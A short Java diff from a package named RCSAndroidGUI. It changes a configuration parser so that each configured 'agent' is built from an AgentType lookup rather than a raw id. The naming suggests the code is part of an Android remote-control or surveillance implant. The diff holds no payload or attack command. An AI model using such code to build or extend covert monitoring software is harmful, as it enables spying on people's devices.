@@ -18,6 +18,7 @@ import com.ht.RCSAndroidGUI.RCSException;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
+import com.ht.RCSAndroidGUI.agent.AgentType;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.EventConf;
@@ -237,7 +238,8 @@ public class Configuration {
 
 			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled + " Params Len: " + plen);
 
-			final AgentConf a = new AgentConf(id, enabled, params);
+			AgentType type = AgentType.get(id);
+			final AgentConf a = new AgentConf(type, enabled, params);
 			status.addAgent(a);
 		}
 
